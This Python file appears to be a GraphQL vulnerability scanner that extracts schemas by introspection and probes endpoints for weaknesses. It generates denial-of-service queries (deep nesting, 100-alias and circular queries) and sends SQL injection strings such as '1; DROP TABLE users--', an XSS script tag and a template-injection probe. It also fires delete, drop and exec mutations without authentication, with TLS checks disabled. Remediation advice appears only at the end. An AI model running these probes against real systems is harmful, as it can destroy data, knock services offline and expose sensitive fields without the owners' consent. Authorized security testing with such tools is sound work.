from typing import Dict, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
import threading
import time
import json
import hashlib

class GraphQLVulnerabilityType(Enum):
    INTROSPECTION_ENABLED = "introspection_enabled"
    QUERY_DEPTH_ATTACK = "query_depth_attack"
    QUERY_COMPLEXITY_ATTACK = "query_complexity_attack"
    BATCH_QUERY_ATTACK = "batch_query_attack"
    FIELD_DUPLICATION = "field_duplication"
    CIRCULAR_QUERY = "circular_query"
    INFORMATION_DISCLOSURE = "information_disclosure"
    INJECTION_VIA_GRAPHQL = "injection_via_graphql"
    AUTHORIZATION_BYPASS = "authorization_bypass"
    DOS_VIA_QUERY = "dos_via_query"
    ALIAS_ABUSE = "alias_abuse"
    DIRECTIVE_OVERLOAD = "directive_overload"
    MUTATION_CSRF = "mutation_csrf"

class QueryType(Enum):
    QUERY = "query"
    MUTATION = "mutation"
    SUBSCRIPTION = "subscription"
    INTROSPECTION = "introspection"

@dataclass
class GraphQLEndpoint:
    url: str
    method: str = "POST"
    headers: Dict[str, str] = field(default_factory=dict)
    introspection_enabled: bool = False
    schema_extracted: bool = False
    authentication_required: bool = False
    rate_limited: bool = False

@dataclass
class GraphQLSchema:
    types: List[Dict] = field(default_factory=list)
    queries: List[Dict] = field(default_factory=list)
    mutations: List[Dict] = field(default_factory=list)
    subscriptions: List[Dict] = field(default_factory=list)
    directives: List[Dict] = field(default_factory=list)
    interfaces: List[Dict] = field(default_factory=list)
    enums: List[Dict] = field(default_factory=list)
    scalars: List[Dict] = field(default_factory=list)

@dataclass
class GraphQLVulnerability:
    vulnerability_type: str
    graphql_type: GraphQLVulnerabilityType
    url: str
    severity: str
    evidence: str
    query_used: str
    response_status: int
    response_size: int
    response_time: float
    schema_info: Optional[Dict] = None
    sensitive_fields: List[str] = field(default_factory=list)
    exploitable_mutations: List[str] = field(default_factory=list)
    confirmed: bool = False
    confidence_score: float = 0.8
    remediation: str = ""
    timestamp: float = field(default_factory=time.time)

class MegaIntrospectionQuery:
    FULL_INTROSPECTION = '''
    query IntrospectionQuery {
        __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
                ...FullType
            }
            directives {
                name
                description
                locations
                args {
                    ...InputValue
                }
            }
        }
    }
    
    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }
    
    fragment InputValue on __InputValue {
        name
        description
        type { ...TypeRef }
        defaultValue
    }
    
    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                    ofType {
                        kind
                        name
                        ofType {
                            kind
                            name
                            ofType {
                                kind
                                name
                                ofType {
                                    kind
                                    name
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    '''
    
    SIMPLE_INTROSPECTION = '''
    {
        __schema {
            types {
                name
                fields {
                    name
                    type {
                        name
                    }
                }
            }
        }
    }
    '''
    
    QUERY_TYPE_INTROSPECTION = '''
    {
        __schema {
            queryType {
                name
                fields {
                    name
                    description
                    args {
                        name
                        type {
                            name
                        }
                    }
                }
            }
        }
    }
    '''
    
    MUTATION_TYPE_INTROSPECTION = '''
    {
        __schema {
            mutationType {
                name
                fields {
                    name
                    description
                    args {
                        name
                        type {
                            name
                        }
                    }
                }
            }
        }
    }
    '''
    
    @staticmethod
    def get_all_queries() -> List[str]:
        return [
            MegaIntrospectionQuery.FULL_INTROSPECTION,
            MegaIntrospectionQuery.SIMPLE_INTROSPECTION,
            MegaIntrospectionQuery.QUERY_TYPE_INTROSPECTION,
            MegaIntrospectionQuery.MUTATION_TYPE_INTROSPECTION,
        ]

class MegaAttackPayloadGenerator:
    @staticmethod
    def generate_depth_attack(depth: int = 15) -> str:
        query = "query DepthAttack {\n"
        for i in range(depth):
            query += "  " * i + "user {\n"
        query += "  " * depth + "id\n"
        for i in range(depth - 1, -1, -1):
            query += "  " * i + "}\n"
        return query
    
    @staticmethod
    def generate_complexity_attack() -> str:
        return '''
        query ComplexityAttack {
            users {
                id name email
                posts { id title content author { id name } }
                comments { id text post { id title } }
                followers { id name email }
                following { id name email }
            }
        }
        '''
    
    @staticmethod
    def generate_batch_attack(count: int = 10) -> List[Dict]:
        batch = []
        for i in range(count):
            batch.append({
                "query": f"query Query{i} {{ users {{ id name email }} }}"
            })
        return batch
    
    @staticmethod
    def generate_alias_attack(alias_count: int = 50) -> str:
        query = "query AliasAttack {\n"
        for i in range(alias_count):
            query += f"  user{i}: user(id: {i}) {{ id name email }}\n"
        query += "}"
        return query
    
    @staticmethod
    def generate_circular_query() -> str:
        return '''
        query CircularQuery {
            user(id: 1) {
                friends {
                    friends {
                        friends {
                            friends {
                                friends {
                                    friends {
                                        id name
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        '''
    
    @staticmethod
    def generate_field_duplication() -> str:
        return '''
        query FieldDuplication {
            user(id: 1) {
                id id id id id
                name name name name name
                email email email email email
            }
        }
        '''
    
    @staticmethod
    def generate_directive_overload() -> str:
        return '''
        query DirectiveOverload {
            user(id: 1) @skip(if: false) @include(if: true) @deprecated(reason: "test") {
                id @skip(if: false) @include(if: true)
                name @skip(if: false) @include(if: true)
                email @skip(if: false) @include(if: true)
            }
        }
        '''
    
    @staticmethod
    def generate_injection_payloads() -> List[str]:
        return [
            'query { user(id: "1 OR 1=1") { id name } }',
            'query { user(id: "1\' OR \'1\'=\'1") { id name } }',
            'query { user(id: "1; DROP TABLE users--") { id name } }',
            'query { user(name: "<script>alert(1)</script>") { id name } }',
            'query { user(name: "{{7*7}}") { id name } }',
        ]

class MegaSchemaAnalyzer:
    SENSITIVE_FIELDS = [
        'password', 'secret', 'token', 'api_key', 'apikey', 'private_key',
        'credit_card', 'ssn', 'social_security', 'auth', 'credential',
        'admin', 'root', 'superuser', 'internal'
    ]
    
    DANGEROUS_MUTATIONS = [
        'delete', 'remove', 'destroy', 'drop', 'truncate', 'exec',
        'execute', 'run', 'eval', 'admin', 'update', 'modify'
    ]
    
    @staticmethod
    def analyze_schema(schema_data: Dict) -> GraphQLSchema:
        schema = GraphQLSchema()
        
        try:
            schema_types = schema_data.get('data', {}).get('__schema', {})
            
            schema.types = schema_types.get('types', [])
            
            query_type = schema_types.get('queryType', {})
            if query_type:
                schema.queries = query_type.get('fields', [])
            
            mutation_type = schema_types.get('mutationType', {})
            if mutation_type:
                schema.mutations = mutation_type.get('fields', [])
            
            subscription_type = schema_types.get('subscriptionType', {})
            if subscription_type:
                schema.subscriptions = subscription_type.get('fields', [])
            
            schema.directives = schema_types.get('directives', [])
        except:
            pass
        
        return schema
    
    @staticmethod
    def find_sensitive_fields(schema: GraphQLSchema) -> List[str]:
        sensitive = []
        
        for type_def in schema.types:
            fields = type_def.get('fields', [])
            for field in fields:
                field_name = field.get('name', '').lower()
                if any(s in field_name for s in MegaSchemaAnalyzer.SENSITIVE_FIELDS):
                    sensitive.append(f"{type_def.get('name', 'Unknown')}.{field.get('name')}")
        
        for query in schema.queries:
            query_name = query.get('name', '').lower()
            if any(s in query_name for s in MegaSchemaAnalyzer.SENSITIVE_FIELDS):
                sensitive.append(f"Query.{query.get('name')}")
        
        return sensitive
    
    @staticmethod
    def find_dangerous_mutations(schema: GraphQLSchema) -> List[str]:
        dangerous = []
        
        for mutation in schema.mutations:
            mutation_name = mutation.get('name', '').lower()
            if any(d in mutation_name for d in MegaSchemaAnalyzer.DANGEROUS_MUTATIONS):
                dangerous.append(mutation.get('name'))
        
        return dangerous
    
    @staticmethod
    def calculate_complexity(schema: GraphQLSchema) -> int:
        complexity = 0
        complexity += len(schema.types) * 1
        complexity += len(schema.queries) * 2
        complexity += len(schema.mutations) * 3
        complexity += len(schema.subscriptions) * 2
        return complexity

class MegaAuthBypassTester:
    @staticmethod
    def test_unauthenticated_introspection(session, url: str, timeout: int) -> Tuple[bool, str]:
        headers = {'Content-Type': 'application/json'}
        
        query = {"query": MegaIntrospectionQuery.SIMPLE_INTROSPECTION}
        
        try:
            response = session.post(url, json=query, headers=headers, timeout=timeout, verify=False)
            
            if response.status_code == 200:
                data = response.json()
                if '__schema' in str(data):
                    return True, 'Introspection accessible without auth'
        except:
            pass
        
        return False, 'Auth required or introspection disabled'
    
    @staticmethod
    def test_mutation_without_auth(session, url: str, mutations: List[str], timeout: int) -> List[str]:
        vulnerable = []
        
        for mutation in mutations[:5]:
            query = {"query": f"mutation {{ {mutation} }}"}
            
            try:
                response = session.post(url, json=query, timeout=timeout, verify=False)
                
                if response.status_code == 200 and 'error' not in response.text.lower():
                    vulnerable.append(mutation)
            except:
                pass
        
        return vulnerable

class GraphQLScanner:
    def __init__(self, max_workers: int = 15):
        self.introspection_queries = MegaIntrospectionQuery()
        self.payload_generator = MegaAttackPayloadGenerator()
        self.schema_analyzer = MegaSchemaAnalyzer()
        self.auth_tester = MegaAuthBypassTester()
        
        self.vulnerabilities = []
        self.extracted_schema = None
        self.lock = threading.Lock()
        self.max_workers = max_workers
    
    def scan(self, target_url: str, response: Dict, session=None) -> List[GraphQLVulnerability]:
        vulns = []
        
        introspection_enabled, schema_data = self._test_introspection(target_url, response, session)
        
        if introspection_enabled:
            vuln = GraphQLVulnerability(
                vulnerability_type='GraphQL Vulnerability',
                graphql_type=GraphQLVulnerabilityType.INTROSPECTION_ENABLED,
                url=target_url,
                severity='High',
                evidence='Introspection query successful',
                query_used=MegaIntrospectionQuery.SIMPLE_INTROSPECTION,
                response_status=response.get('status_code', 0),
                response_size=len(response.get('content', '')),
                response_time=response.get('response_time', 0),
                schema_info=schema_data,
                confirmed=True,
                confidence_score=0.95,
                remediation=self._get_remediation()
            )
            vulns.append(vuln)
            
            if schema_data:
                schema = self.schema_analyzer.analyze_schema(schema_data)
                self.extracted_schema = schema
                
                sensitive = self.schema_analyzer.find_sensitive_fields(schema)
                if sensitive:
                    vuln = GraphQLVulnerability(
                        vulnerability_type='GraphQL Vulnerability',
                        graphql_type=GraphQLVulnerabilityType.INFORMATION_DISCLOSURE,
                        url=target_url,
                        severity='High',
                        evidence=f'Sensitive fields exposed: {", ".join(sensitive[:10])}',
                        query_used='Schema Analysis',
                        response_status=200,
                        response_size=0,
                        response_time=0,
                        sensitive_fields=sensitive,
                        confirmed=True,
                        confidence_score=0.92,
                        remediation=self._get_remediation()
                    )
                    vulns.append(vuln)
                
                dangerous = self.schema_analyzer.find_dangerous_mutations(schema)
                if dangerous and session:
                    unauth_mutations = self.auth_tester.test_mutation_without_auth(
                        session, target_url, dangerous, 10
                    )
                    
                    if unauth_mutations:
                        vuln = GraphQLVulnerability(
                            vulnerability_type='GraphQL Vulnerability',
                            graphql_type=GraphQLVulnerabilityType.AUTHORIZATION_BYPASS,
                            url=target_url,
                            severity='Critical',
                            evidence=f'Mutations accessible without auth: {", ".join(unauth_mutations)}',
                            query_used='Mutation Auth Test',
                            response_status=200,
                            response_size=0,
                            response_time=0,
                            exploitable_mutations=unauth_mutations,
                            confirmed=True,
                            confidence_score=0.98,
                            remediation=self._get_remediation()
                        )
                        vulns.append(vuln)
        
        if session:
            dos_vulns = self._test_dos_attacks(target_url, session)
            vulns.extend(dos_vulns)
            
            injection_vulns = self._test_injection_attacks(target_url, session)
            vulns.extend(injection_vulns)
        
        with self.lock:
            self.vulnerabilities.extend(vulns)
        
        return vulns
    
    def _test_introspection(self, url: str, response: Dict, session) -> Tuple[bool, Optional[Dict]]:
        if not session:
            return False, None
        
        for query_str in self.introspection_queries.get_all_queries():
            try:
                query = {"query": query_str}
                resp = session.post(url, json=query, timeout=10, verify=False)
                
                if resp.status_code == 200:
                    data = resp.json()
                    if '__schema' in str(data):
                        return True, data
            except:
                pass
        
        return False, None
    
    def _test_dos_attacks(self, url: str, session) -> List[GraphQLVulnerability]:
        vulns = []
        
        depth_query = self.payload_generator.generate_depth_attack(20)
        start = time.time()
        try:
            resp = session.post(url, json={"query": depth_query}, timeout=15, verify=False)
            elapsed = time.time() - start
            
            if elapsed > 5 or resp.status_code == 500:
                vulns.append(GraphQLVulnerability(
                    vulnerability_type='GraphQL Vulnerability',
                    graphql_type=GraphQLVulnerabilityType.QUERY_DEPTH_ATTACK,
                    url=url,
                    severity='High',
                    evidence=f'Depth attack successful - Response time: {elapsed:.2f}s',
                    query_used=depth_query[:200],
                    response_status=resp.status_code,
                    response_size=len(resp.content),
                    response_time=elapsed,
                    confirmed=True,
                    confidence_score=0.87,
                    remediation=self._get_remediation()
                ))
        except:
            pass
        
        alias_query = self.payload_generator.generate_alias_attack(100)
        try:
            start = time.time()
            resp = session.post(url, json={"query": alias_query}, timeout=15, verify=False)
            elapsed = time.time() - start
            
            if elapsed > 5 or resp.status_code == 500:
                vulns.append(GraphQLVulnerability(
                    vulnerability_type='GraphQL Vulnerability',
                    graphql_type=GraphQLVulnerabilityType.ALIAS_ABUSE,
                    url=url,
                    severity='Medium',
                    evidence=f'Alias attack successful - Response time: {elapsed:.2f}s',
                    query_used=alias_query[:200],
                    response_status=resp.status_code,
                    response_size=len(resp.content),
                    response_time=elapsed,
                    confirmed=True,
                    confidence_score=0.85,
                    remediation=self._get_remediation()
                ))
        except:
            pass
        
        return vulns
    
    def _test_injection_attacks(self, url: str, session) -> List[GraphQLVulnerability]:
        vulns = []
        
        injection_payloads = self.payload_generator.generate_injection_payloads()
        
        for payload in injection_payloads:
            try:
                resp = session.post(url, json={"query": payload}, timeout=10, verify=False)
                
                error_indicators = ['syntax error', 'sql', 'mysql', 'postgresql', 'sqlite']
                if any(ind in resp.text.lower() for ind in error_indicators):
                    vulns.append(GraphQLVulnerability(
                        vulnerability_type='GraphQL Vulnerability',
                        graphql_type=GraphQLVulnerabilityType.INJECTION_VIA_GRAPHQL,
                        url=url,
                        severity='High',
                        evidence=f'Injection indicator detected in response',
                        query_used=payload,
                        response_status=resp.status_code,
                        response_size=len(resp.content),
                        response_time=0,
                        confirmed=True,
                        confidence_score=0.82,
                        remediation=self._get_remediation()
                    ))
                    break
            except:
                pass
        
        return vulns
    
    def _get_remediation(self) -> str:
        return (
            "1. Disable introspection in production. "
            "2. Implement query depth limiting. "
            "3. Set query complexity limits. "
            "4. Rate limit GraphQL endpoint. "
            "5. Implement proper authentication. "
            "6. Use query allowlisting. "
            "7. Validate all inputs. "
            "8. Monitor query patterns. "
            "9. Implement field-level authorization. "
            "10. Use persisted queries."
        )
    
    def get_vulnerabilities(self):
        with self.lock:
            return self.vulnerabilities.copy()
    
    def get_extracted_schema(self):
        return self.extracted_schema
    
    def clear(self):
        with self.lock:
            self.vulnerabilities.clear()
            self.extracted_schema = None
